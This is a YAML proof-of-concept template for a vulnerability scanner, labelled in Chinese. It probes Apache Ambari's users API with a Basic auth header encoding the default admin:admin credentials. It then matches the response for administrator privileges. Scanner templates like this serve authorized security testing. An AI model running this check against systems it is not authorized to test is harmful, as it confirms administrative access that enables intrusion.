id: poc-yaml-apache-ambari-default-password
info:
  name: Apache Ambari 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Apache Ambari
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: GET
  path: /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name
  headers:
    Authorization: Basic YWRtaW46YWRtaW4=
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(body, "PrivilegeInfo") && contains(body,
    "AMBARI.ADMINISTRATOR")
  output: []
